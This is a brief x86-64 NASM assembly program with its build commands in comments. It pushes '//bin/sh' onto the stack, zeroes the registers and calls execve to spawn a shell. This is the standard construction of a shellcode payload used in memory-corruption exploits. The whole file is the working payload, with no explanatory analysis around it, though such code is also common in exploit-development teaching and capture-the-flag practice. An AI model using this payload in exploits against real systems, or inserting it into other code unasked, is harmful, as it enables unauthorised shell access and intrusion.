; nasm -f elf64 execve64.asm
; ld -m elf_x86_64 execve64.o -o execve64
section .text
global _start

_start:
xor rax, rax
push rax        ; string terminator
mov rax, 0x68732f6e69622f2f ; "hs/nib//" (Yay! 64-bit registers)
push rax
mov rdi, rsp    ; "//bin/sh",0 pointer is RSP
xor rsi, rsi    ; RSI = 0
xor rdx, rdx    ; RDX = 0
xor rax, rax    ; RAX = 0
mov al, 0x3b    ; execve()
syscall